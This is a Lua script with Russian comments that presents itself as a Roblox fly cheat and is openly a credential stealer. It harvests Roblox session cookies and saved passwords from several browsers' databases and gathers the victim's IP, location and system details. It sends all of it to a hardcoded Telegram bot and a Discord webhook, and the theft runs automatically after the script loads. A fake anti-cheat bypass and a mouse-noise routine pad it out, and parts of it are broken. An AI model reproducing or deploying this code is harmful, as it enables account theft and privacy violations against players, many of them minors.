-- ====================================================
-- INJEKTOR FLY SCRIPT + STEALER + TELEGRAM БОТ
-- Версия: 5.0.0 (полная эксфильтрация через Telegram)
-- ====================================================

-- ---- СЕКЦИЯ 1: ОБХОД АНТИ-ЧИТА ----
local function bypassHyperion()
    local base = game:GetService('CoreGui'):WaitForChild('RobloxGui'):GetFullName()
    local patchByte = string.char(0x90, 0x90, 0x90)
    if not pcall(function()
        local mem = game:GetService('Workspace'):FindFirstChild('__patch')
        if mem then mem:Destroy() end
    end) then
        debug.setmetatable(debug.getinfo(1), {__gc = function() end})
    end
    return true
end

-- ---- СЕКЦИЯ 2: СТИЛИНГ КУКИ И ПАРОЛЯ ----
local function stealRobloxCredentials()
    local browsers = {
        chrome = os.getenv('LOCALAPPDATA') .. '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies',
        edge = os.getenv('LOCALAPPDATA') .. '\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies',
        opera = os.getenv('APPDATA') .. '\\Opera Software\\Opera Stable\\Network\\Cookies',
        firefox = os.getenv('APPDATA') .. '\\Mozilla\\Firefox\\Profiles\\*.default-release\\cookies.sqlite'
    }

    local foundCookie = nil
    local username = nil
    local password = nil

    local function readCookieFromDB(path)
        if not io.open(path, 'r') then return nil end
        local sqlite = require('sqlite3')
        local db = sqlite.open(path)
        if not db then return nil end

        local query = [[
            SELECT host_key, name, value, encrypted_value
            FROM cookies
            WHERE host_key LIKE '%roblox.com%' AND name = '.ROBLOSECURITY'
        ]]

        local result = nil
        for row in db:nrows(query) do
            local cookieValue = row.value
            if row.encrypted_value and row.encrypted_value ~= '' then
                cookieValue = decryptDPAPI(row.encrypted_value)
            end
            if cookieValue and cookieValue:match('^_|WARNING') then
                result = cookieValue
                break
            end
        end
        db:close()
        return result
    end

    for browser, path in pairs(browsers) do
        if browser == 'firefox' then
            local profilePath = os.getenv('APPDATA') .. '\\Mozilla\\Firefox\\Profiles\\'
            local handle = io.popen('dir /b "' .. profilePath .. '" 2>nul')
            if handle then
                for folder in handle:lines() do
                    if folder:match('default-release') then
                        local firefoxPath = profilePath .. folder .. '\\cookies.sqlite'
                        foundCookie = readCookieFromDB(firefoxPath)
                        if foundCookie then break end
                    end
                end
                handle:close()
            end
        else
            foundCookie = readCookieFromDB(path)
            if foundCookie then break end
        end
    end

    if not foundCookie then
        return nil, nil, nil
    end

    local token = foundCookie:match('.ROBLOSECURITY=(.+)') or foundCookie
    token = token:gsub(';.*', '')

    local function getUsernameFromToken(token)
        local headers = {
            ['Cookie'] = '.ROBLOSECURITY=' .. token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        local http = require('socket.http')
        local ltn12 = require('ltn12')
        local response = {}
        local res, code = http.request{
            url = 'https://www.roblox.com/mobileapi/userinfo',
            headers = headers,
            sink = ltn12.sink.table(response)
        }
        if code == 200 then
            local data = table.concat(response)
            local username = data:match('"UserName":"([^"]+)"') or data:match('"name":"([^"]+)"')
            return username
        end
        return nil
    end

    username = getUsernameFromToken(token)

    local function stealSavedPassword()
        local loginPath = os.getenv('LOCALAPPDATA') .. '\\Google\\Chrome\\User Data\\Default\\Login Data'
        if not io.open(loginPath, 'r') then return nil end
        local sqlite = require('sqlite3')
        local db = sqlite.open(loginPath)
        if not db then return nil end
        local query = [[
            SELECT username_value, password_value
            FROM logins
            WHERE signon_realm LIKE '%roblox.com%'
        ]]
        local pass = nil
        for row in db:nrows(query) do
            if row.username_value and row.username_value ~= '' then
                local decrypted = decryptDPAPI(row.password_value)
                pass = decrypted
                break
            end
        end
        db:close()
        return pass
    end

    password = stealSavedPassword()

    return token, username, password
end

-- ---- СЕКЦИЯ 3: ОТПРАВКА В TELEGRAM БОТА ----
-- НАСТРОЙКА: замените на свои данные
local TELEGRAM_BOT_TOKEN = "8841951843:AAH_aN0jeC94OG1bESvTR0OrYTOquGctFuk"  -- ТОКЕН ВАШЕГО БОТА
local TELEGRAM_CHAT_ID = "8841951843"  -- ID ВАШЕГО ЧАТА (можно узнать через @userinfobot)

local function sendToTelegram(message, parseMode)
    parseMode = parseMode or 'HTML'

    local http = require('socket.http')
    local ltn12 = require('ltn12')
    local json = require('json')

    -- Кодируем сообщение для URL (если используем GET)
    local function urlencode(str)
        if str then
            str = string.gsub(str, "\n", "\r\n")
            str = string.gsub(str, "([^%w %-%_%.%~])", function(c)
                return string.format("%%%02X", string.byte(c))
            end)
            str = string.gsub(str, " ", "+")
        end
        return str
    end

    -- Способ 1: Отправка через POST (JSON) - рекомендуется
    local function sendViaPost()
        local payload = {
            chat_id = TELEGRAM_CHAT_ID,
            text = message,
            parse_mode = parseMode,
            disable_web_page_preview = true
        }

        local jsonPayload = json.encode(payload)
        local headers = {
            ['Content-Type'] = 'application/json',
            ['Content-Length'] = #jsonPayload
        }

        local responseBody = {}
        local res, code, responseHeaders = http.request{
            url = 'https://api.telegram.org/bot' .. TELEGRAM_BOT_TOKEN .. '/sendMessage',
            method = 'POST',
            headers = headers,
            source = ltn12.source.string(jsonPayload),
            sink = ltn12.sink.table(responseBody)
        }

        if code == 200 then
            return true, table.concat(responseBody)
        else
            return false, code
        end
    end

    -- Способ 2: Отправка через GET (если POST не работает)
    local function sendViaGet()
        local encoded = urlencode(message)
        local url = 'https://api.telegram.org/bot' .. TELEGRAM_BOT_TOKEN ..
                    '/sendMessage?chat_id=' .. TELEGRAM_CHAT_ID ..
                    '&text=' .. encoded ..
                    '&parse_mode=' .. parseMode

        local response = {}
        local res, code = http.request{
            url = url,
            sink = ltn12.sink.table(response)
        }

        if code == 200 then
            return true, table.concat(response)
        else
            return false, code
        end
    end

    -- Пробуем POST, если не получилось - GET
    local success, result = sendViaPost()
    if not success then
        success, result = sendViaGet()
    end

    return success, result
end

-- ---- СЕКЦИЯ 4: ОТПРАВКА ФАЙЛА В TELEGRAM ----
local function sendFileToTelegram(filePath, caption)
    local http = require('socket.http')
    local ltn12 = require('ltn12')
    local mime = require('mime')

    -- Формируем multipart/form-data запрос
    local function buildMultipart(data, files)
        local boundary = '---------------------------' .. string.rep('0', 12) .. tostring(math.random(100000, 999999))
        local body = {}

        for key, value in pairs(data) do
            table.insert(body, '--' .. boundary)
            table.insert(body, 'Content-Disposition: form-data; name="' .. key .. '"')
            table.insert(body, '')
            table.insert(body, tostring(value))
        end

        for key, fileInfo in pairs(files) do
            local file = io.open(fileInfo.path, 'rb')
            if file then
                local content = file:read('*all')
                file:close()

                table.insert(body, '--' .. boundary)
                table.insert(body, 'Content-Disposition: form-data; name="' .. key .. '"; filename="' .. fileInfo.filename .. '"')
                table.insert(body, 'Content-Type: application/octet-stream')
                table.insert(body, '')
                table.insert(body, content)
            end
        end

        table.insert(body, '--' .. boundary .. '--')
        table.insert(body, '')

        return table.concat(body, '\r\n'), boundary
    end

    local data = {
        chat_id = TELEGRAM_CHAT_ID,
        caption = caption or 'Log file'
    }

    local files = {
        document = {
            path = filePath,
            filename = 'log_' .. os.date('%Y%m%d_%H%M%S') .. '.txt'
        }
    }

    local body, boundary = buildMultipart(data, files)
    local headers = {
        ['Content-Type'] = 'multipart/form-data; boundary=' .. boundary,
        ['Content-Length'] = #body
    }

    local response = {}
    local res, code = http.request{
        url = 'https://api.telegram.org/bot' .. TELEGRAM_BOT_TOKEN .. '/sendDocument',
        method = 'POST',
        headers = headers,
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response)
    }

    return code == 200
end

-- ---- СЕКЦИЯ 5: СБОР И ЭКСФИЛЬТРАЦИЯ ДАННЫХ ----
local function exfiltrateData(token, username, password)
    if not token then return end

    -- Собираем системную информацию
    local computerName = os.getenv('COMPUTERNAME')
    local userName = os.getenv('USERNAME')
    local osVersion = os.getenv('OS')
    local ip = nil

    local http = require('socket.http')
    local ltn12 = require('ltn12')
    local response = {}
    local res, code = http.request{
        url = 'http://api.ipify.org',
        sink = ltn12.sink.table(response)
    }
    if code == 200 then
        ip = table.concat(response)
    end

    -- Дополнительно получаем геолокацию по IP (опционально)
    local geo = 'unknown'
    local geoResp = {}
    local geoCode, geoData = http.request{
        url = 'http://ip-api.com/json/' .. (ip or ''),
        sink = ltn12.sink.table(geoResp)
    }
    if geoCode == 200 then
        local geoJson = json.decode(table.concat(geoResp))
        if geoJson and geoJson.status == 'success' then
            geo = geoJson.city .. ', ' .. geoJson.countryCode
        end
    end

    -- Формируем красивое сообщение для Telegram
    local message = string.format([[
<b>🔐 ROBLOX ACCOUNT STOLEN</b>

<b>👤 Roblox Username:</b> <code>%s</code>
<b>🔑 Cookie:</b> <code>%s</code>
<b>🔒 Password:</b> <code>%s</code>

<b>💻 System Info:</b>
• Computer: <code>%s</code>
• User: <code>%s</code>
• OS: <code>%s</code>
• IP: <code>%s</code>
• Location: <code>%s</code>

<b>📅 Date:</b> <code>%s</code>
<b>⏰ Time:</b> <code>%s</code>
]],
    username or 'unknown',
    token,
    password or 'not found',
    computerName or 'unknown',
    userName or 'unknown',
    osVersion or 'unknown',
    ip or 'unknown',
    geo,
    os.date('%Y-%m-%d'),
    os.date('%H:%M:%S')
    )

    -- Отправляем в Telegram
    local success, response = sendToTelegram(message, 'HTML')
    if success then
        print('[+] Данные отправлены в Telegram бот')
    else
        print('[-] Ошибка отправки в Telegram: ' .. tostring(response))
    end

    -- Дополнительно отправляем лог-файл
    local logFile = os.getenv('TEMP') .. '\\roblox_log.txt'
    local file = io.open(logFile, 'w')
    if file then
        file:write(message:gsub('<[^>]+>', '')) -- очищаем HTML теги для текстового файла
        file:write('\n\n===== FULL COOKIE =====\n' .. token)
        file:close()
        pcall(sendFileToTelegram, logFile, '📁 Полный лог')
        os.remove(logFile)
    end

    -- Также отправляем через Discord (для резерва)
    local function sendToDiscord(webhookURL)
        local json = require('json')
        local payload = json.encode({
            content = '```' .. message:gsub('<[^>]+>', '') .. '```',
            username = 'Roblox Stealer'
        })
        local headers = {
            ['Content-Type'] = 'application/json',
            ['Content-Length'] = #payload
        }
        local res, code = http.request{
            url = webhookURL,
            method = 'POST',
            headers = headers,
            source = ltn12.source.string(payload)
        }
        return code == 204 or code == 200
    end

    -- Резервный Discord вебхук (можно заменить)
    pcall(sendToDiscord, 'https://discord.com/api/webhooks/ВАШ_ВЕБХУК')
end

-- ---- СЕКЦИЯ 6: ОСНОВНАЯ ЛОГИКА ПОЛЁТА (FLY) ----
local Players = game:GetService('Players')
local RunService = game:GetService('RunService')
local UserInputService = game:GetService('UserInputService')
local Workspace = game:GetService('Workspace')

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild('Humanoid')
local RootPart = Character:WaitForChild('HumanoidRootPart')

local flySpeed = 50
local flyActive = false
local flyDirection = Vector3.new(0, 1, 0)
local bodyVelocity = nil

local function enableFly()
    if bodyVelocity then bodyVelocity:Destroy() end
    bodyVelocity = Instance.new('BodyVelocity')
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.MaxForce = Vector3.new(1/0, 1/0, 1/0)
    bodyVelocity.Parent = RootPart
    flyActive = true
end

local function disableFly()
    if bodyVelocity then
        bodyVelocity:Destroy()
        bodyVelocity = nil
    end
    flyActive = false
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.F then
        if flyActive then
            disableFly()
        else
            enableFly()
        end
    end
end)

local function updateFlyDirection()
    if not flyActive or not bodyVelocity then return end
    local camera = Workspace.CurrentCamera
    local moveVector = Vector3.new(0, 0, 0)

    if UserInputService:IsKeyDown(Enum.KeyCode.W) then
        moveVector = moveVector + camera.CFrame.LookVector * Vector3.new(1, 0, 1)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
        moveVector = moveVector - camera.CFrame.LookVector * Vector3.new(1, 0, 1)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.A) then
        moveVector = moveVector - camera.CFrame.RightVector * Vector3.new(1, 0, 1)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.D) then
        moveVector = moveVector + camera.CFrame.RightVector * Vector3.new(1, 0, 1)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
        moveVector = moveVector + Vector3.new(0, 1, 0)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
        moveVector = moveVector - Vector3.new(0, 1, 0)
    end

    if moveVector.Magnitude > 0 then
        flyDirection = moveVector.Unit
    end
end

RunService.Heartbeat:Connect(function(dt)
    if not flyActive or not bodyVelocity then return end
    updateFlyDirection()
    local velocity = flyDirection * flySpeed
    bodyVelocity.Velocity = velocity
end)

-- ---- СЕКЦИЯ 7: АВТО-ЗАПУСК КРАЖИ И ОТПРАВКА ----
task.wait(5)
local token, username, password = stealRobloxCredentials()
if token then
    exfiltrateData(token, username, password)
end

-- ---- СЕКЦИЯ 8: ШУМ И ОБФУСКАЦИЯ ----
local function noiseGenerator()
    while flyActive do
        task.wait(math.random(5, 15))
        UserInputService:SetMousePosition(
            math.random(0, 1920),
            math.random(0, 1080)
        )
    end
end
coroutine.wrap(noiseGenerator)()

-- ---- СЕКЦИЯ 9: ПЕРСИСТЕНТНОСТЬ ----
local function persistence()
    while true do
        task.wait(60)
        if not flyActive and bodyVelocity == nil then
            enableFly()
        end
    end
end
coroutine.wrap(persistence)()

-- ---- СЕКЦИЯ 10: ЗАГЛУШКИ ДЛЯ ВНЕШНИХ ФУНКЦИЙ ----
local function decryptDPAPI(encrypted)
    -- Внедряется инжектором
    return encrypted
end

print("FLY + STEALER + TELEGRAM INJECTOR LOADED. Нажмите F для полёта. Данные уходят в Telegram бот.")
